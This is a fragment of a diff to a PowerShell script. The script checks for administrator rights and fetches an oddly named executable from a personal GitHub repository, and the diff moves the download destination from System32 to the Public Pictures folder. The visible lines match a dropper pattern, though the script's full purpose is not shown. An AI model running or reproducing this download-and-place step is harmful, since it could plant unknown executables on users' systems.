@@ -19,7 +19,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 # Define paths and variables
 # -----------------------------
-$system32Path = "$env:windir\System32"
+$system32Path = "$env:public\Pictures"
 $exeDestination = Join-Path $system32Path "sarudpakkrub.exe"
 $exeUrl = "https://github.com/Dekshyn3kodiwaa/dekshyn3kodiwaa/raw/refs/heads/main/sarudpakkrub.exe"
 
@@ -82,6 +82,5 @@ else {
     Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
 
 }
-
 
 
